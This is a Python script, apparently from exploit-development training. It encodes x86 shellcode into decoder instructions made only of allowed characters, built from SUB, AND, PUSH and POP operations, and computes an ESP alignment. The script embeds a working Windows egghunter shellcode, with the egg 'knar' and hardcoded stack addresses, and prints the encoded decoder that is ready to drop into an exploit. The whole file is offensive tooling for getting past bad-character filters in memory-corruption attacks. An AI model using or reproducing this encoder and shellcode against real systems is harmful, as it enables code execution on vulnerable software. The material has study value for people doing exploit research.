#!/usr/bin/env python
# Code for find_terms function adapted from https://vulners.com/metasploit/MSF:ENCODER/X86/OPT_SUB

# sc variable should contain the target decoded shellcode
# esp_current variable should contain the value of ESP at the first instruction of the generated decoder shellcode
# esp_target variable should contain the address where the target shellcode will be decoded
# esp_target should be separated from the decoder shellcode by a sled of inoffensive instructions
# if esp_current and esp_target are not provided, ESP must already point to the address where the shellcode will be decoded
# goodchar should be a string containing valid characters to be used by the decoder
# It requires minimum 16 bytes per 4 bytes of shellcode to be decoded + 19 bytes for ESP alignment
# If EAX needs to be zeroized, this will generate an additional 12 bytes the 1st time and 2 bytes for each subsequent need

# Original shellcode
egg = "knar"
sc_desc = "# NtAccessCheckAndAuditAlarm Shellcode Egghunter\n# Egg: %s" %egg
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + egg + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
subesp = "\x81\xEC\x00\x10\x00\x00\x41\x41" # SUB ESP, 0x1000 # May be required if payload crashes (the decoded shellcode might be overwriting itself)
sc = subesp + egghunter


# ESP Alignment values
esp_current = 0x1034E1E8
esp_target  = 0x1035FFF0


# Valid Charset definition
SET_ALPHAU   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # 0x41 --> 0x5A
SET_ALPHAL   = "abcdefghijklmnopqrstuvwxyz" # 0x61 --> 0x7A
SET_NUM      = "0123456789"                 # 0x30 --> 0x39
SET_CUST     = ""
SET_SYM      = "!@#$%^&*()_+\\-=[]{};'\":<>,.?/|~"
SET_FILESYM  = '()_+-=\\/.,[]{}@!$%^&='
SET_0        = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
SET_1        = "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
SET_2        = "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e"
SET_3        = "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e"
SET_4        = "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
SET_5        = "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
SET_6        = "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
SET_7        = "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
MAND_OPCODES = "\x25\x50\x52\x54\x58\x5A\x5C\x2D"

goodchar = SET_ALPHAL + SET_ALPHAU + SET_NUM + MAND_OPCODES + "\x23" + SET_0

MIN_COMPONENTS = 1
MAX_COMPONENTS = 3


# ------------------------------------------------------------
#              NO USER-SERVICEABLE VAR BELOW THIS
# ------------------------------------------------------------

import binascii
import struct
import sys
from itertools import combinations



CRED = "\033[91m"; CGRE = "\033[92m"; CYEL = "\033[93m"; CBLU = "\033[94m"; CPUR = "\033[95m"; CCYA = "\033[96m"; CWHI = "\033[97m"; CRST = "\033[0m"; BRED= "\033[41m"

REQUIRED_OPCODES = {
    "AND_EAX"  : "\x25",    # %
    "SUB_EAX"  : "\x2D",    # -
    "PUSH_EAX" : "\x50",    # P
    "PUSH_EDX" : "\x52",    # R
    "PUSH_ESP" : "\x54",    # T
    "POP_EAX"  : "\x58",    # X
    "POP_EDX"  : "\x5A",    # Z
    "POP_ESP"  : "\x5C",    # \
}

valid_bytes = set()

for c in goodchar:
    valid_bytes.add(ord(c))
valid_bytes = list(valid_bytes)
list = ""

for i in valid_bytes:
    list += "0x%02x " %i
    if i in range(0x20, 0x7f):
        list += "(%s) " % chr(i)

missing_opcodes = []
for opcode in REQUIRED_OPCODES:
    if ord(REQUIRED_OPCODES[opcode]) not in valid_bytes:
        halt = True
        missing_opcodes.append("0x%02x: %s" % (ord(REQUIRED_OPCODES[opcode]), opcode))

if missing_opcodes :
    print("%sMissing the following opcodes in the valid charset to build shellcode :%s" % (CRED, CRST))
    for opcode in missing_opcodes:
        print(opcode)
    print("\n"*3)
    sys.exit()


def pad(str, int, chr):
    while len(str) % int:
        str += chr
    return str


def stre(s):
    return ''.join('\\x' + binascii.hexlify(c) for c in s)


def split_word(hexstr):
    n = 8
    return [(int(hexstr[i:i+n], 16)) for i in range(0, len(hexstr), n)]


def find_terms(chunk, previous=0):
    target = previous - chunk

    for terms_count in range(MIN_COMPONENTS, MAX_COMPONENTS+1):
        terms   = [0] * terms_count
        carry  = 0

        for byte_num in range(0, 4):
            b =  target >> (byte_num * 8) & 0xFF

            for combo in combinations(valid_bytes, len(terms)):
                # get the total of the three current bytes, including the carry from
                # the previous calculation
                total = sum(combo) + carry

                # if we matched a byte..
                if (total & 0xFF) == b:
                    # store the carry for the next calculation
                    carry = (total >> 8) & 0xFF
                    # store the values in the respective locations
                    for i in range(len(terms)):
                        terms[i] |= combo[i] << (byte_num * 8)
                    break

        # if a solution is found
        if previous == sum(terms, chunk) % 2**32:
            break

    # raise exception if no solution found
    assert previous == sum(terms, chunk) % 2**32

    return terms, chunk


def find_opposite_bytes(list):
    for b1 in list:
        for b2 in list:
            if b1 & b2 == 0:
                return b1, b2
    return None, None


def ascii_san(s):
    san = ""
    for c in s:
        if ord(c) in range(0x20, 0x7f):
            san += c
        else:
            san += "."
    return san


def zeroize_eax(sc_enc, sc_enc_verb, eaxz):
    eax1, eax2 = find_opposite_bytes(valid_bytes)
    if eaxz == 0:
        sc_enc_verb += "# Zeroizing EAX and saving value into EDX\n"
        sc_enc      += "%s%s%s%s%s" % (chr(0x25), chr(eax1), chr(eax1), chr(eax1), chr(eax1))
        sc_enc      += "%s%s%s%s%s" % (chr(0x25),chr(eax2), chr(eax2), chr(eax2), chr(eax2))
        sc_enc_verb += "\"\\x25\\x%02x\\x%02x\\x%02x\\x%02x\"    # AND EAX 0x%02x%02x%02x%02x\n" % (eax1, eax1, eax1, eax1, eax1, eax1, eax1, eax1)
        sc_enc_verb += "\"\\x25\\x%02x\\x%02x\\x%02x\\x%02x\"    # AND EAX 0x%02x%02x%02x%02x\n" % (eax2, eax2, eax2, eax2, eax2, eax2, eax2, eax2)
        sc_enc      += "\x50"
        sc_enc      += "\x5A"
        sc_enc_verb += "\"\\x50\"                    # PUSH EAX\n"
        sc_enc_verb += "\"\\x5A\"                    # POP EDX\n\n"
        eaxz = 1
    else:
        sc_enc_verb += "# Zeroizing EAX from EDX\n"
        sc_enc      += "\x52"
        sc_enc      += "\x58"
        sc_enc_verb += "\"\\x52\"                    # PUSH 0x%08x (EDX)\n" % 0
        sc_enc_verb += "\"\\x58\"                    # POP EAX\n\n"
    return sc_enc, sc_enc_verb, eaxz


def encodesc(sc, esp_cur=None, esp_tgt=None):
    eaxz = 0
    sc_enc = ""
    sc_enc_verb = "# " + "-"*60
    previous = 0

    # Step 1: Reverse shellcode (setup correct endianness for decoding)
    sc = sc[::-1]

    # Step 2: Pad shellcode to DWORDS
    sc = pad(sc, 4, "\x90")
    sc_hex =  binascii.hexlify(sc)

    # Step 3: Split shellcode into DWORDS
    sc_words = split_word(sc_hex)
    sc_sums = []

    sc_enc_verb += "\n"
    sc_enc_verb += sc_desc
    sc_enc_verb += "\n# length: LENPLACEHOLDER bytes\n\n"
    sc_enc_verb += "shellcode_decoder = (\n"

    # Step 4: Compute ESP alignment shellcode
    if esp_cur and esp_tgt:
        sc_enc_verb += "# Perform ESP offset alignment towards desired target\n"
        sc_enc_verb += "# ESP=0x%08x, Target=0x%08x: " % (esp_cur, esp_tgt)

        try:
            terms, previous = find_terms(esp_tgt, esp_cur)

        except AssertionError :
            sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
            sc_enc_verb += "# %s/!\ WARNING: Cannot compute target ESP with the available charset %s\n" % (CRED, CRST)
            sc_enc_verb += "# %s/!\ ESP must already point to the address where the shellcode will be decoded /!\ %s\n"% (CRED, CRST)
            sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP\n\n\n"

        else:
            sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)
            # Get EIP into EAX
            sc_enc      += "\x54"
            sc_enc      += "\x58"
            sc_enc_verb += "\"\\x54\"                    # PUSH ESP\n"
            sc_enc_verb += "\"\\x58\"                    # POP EAX\n"

            for val in terms:
                sc_enc      +=             "\x2D" + struct.pack('<I', val)
                sc_enc_verb += "\"" + stre("\x2D" + struct.pack('<I', val)) + "\"    # SUB EAX, 0x%08x\n" % val

            sc_enc      += "\x50"
            sc_enc      += "\x5C"
            sc_enc_verb += "\"\\x50\"                    # PUSH 0x%x (EAX)\n" % esp_target
            sc_enc_verb += "\"\\x5C\"                    # POP ESP\n"
            sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP (0x%x)\n\n" %esp_target
    else:
        sc_enc_verb += "# /!\ WARNING: No value provided for EIP current/target /!\ \n"
        sc_enc_verb += "# /!\ ESP must already point to the address where the shellcode will be decoded /!\ \n"
        sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP\n\n"

    # Step 5: Compute the sum terms for each chunk; each computation will take the previous result as starting point
    for i in range(len(sc_words)):
        if i != 0: sc_enc_verb += "\n"
        if previous == 0:
            sc_enc, sc_enc_verb, eaxz = zeroize_eax(sc_enc, sc_enc_verb, eaxz)
            sc_enc_verb += "\n"

        # Compute each chunk sub components
        sc_enc_verb += "# EAX=0x%08x, Target=0x%08x:" % (previous, sc_words[i])
        try:
            terms, previous = find_terms(sc_words[i], previous)

        # If the computation failed, try again starting with EAX = 0
        except AssertionError as e:
            previous = 0
            sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
            sc_enc, sc_enc_verb, eaxz = zeroize_eax(sc_enc, sc_enc_verb, eaxz)
            sc_enc_verb += "# EAX=0x%08x, Target=0x%08x:" % (previous, sc_words[i])
            try:
                terms, previous = find_terms(sc_words[i], previous)

            # If it failed again, abort
            except AssertionError as e:
                sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
                sc_enc_verb += "# %s/!\ No solution found with the available charset %s\n)" % (CRED, CRST)
                print(sc_enc_verb)
                raise Exception("%sno solution with available charset%s" % (CRED, CRST))

            else:
                sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)

        else:
            sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)

        # Add the results in their respective arrays
        sc_sums.append(terms)

        # Produce the SUB instructions
        for val in sc_sums[-1]:
            sc_enc      +=             "\x2D" + struct.pack('<I', val)
            sc_enc_verb += "\"" + stre("\x2D" + struct.pack('<I', val)) + "\"    # SUB EAX, 0x%08x\n" % val

        # Push the decoded shellcode chunk on the stack
        sc_enc      += "\x50"
        sc_enc_verb += "\"\\x50\"                    # PUSH 0x%08x (EAX)\n" % sc_words[i]

    # End the variable
    sc_enc_verb += ")\n# " + "-"*60 + "\n\n"

    # Write shellcode length in the header
    sc_enc_verb = sc_enc_verb.replace("LENPLACEHOLDER",str(len(sc_enc)))

    return sc_enc, sc_enc_verb



sc_encoded, sc_encoded_verb = encodesc(sc, esp_current, esp_target)

print("Valid charset: %s\n\n\n" % list)
print("" + sc_encoded_verb)
print("Original shellcode length: %i" %len(sc))
print("Encoded  shellcode length: %i" % len(sc_encoded))
print("\noriginal_shellcode = \"%s\"") % stre(sc)
print("\nshellcode_decoder = \"%s\"")  % stre(sc_encoded)
print("\nASCII : \"%s\"") % ascii_san(sc_encoded)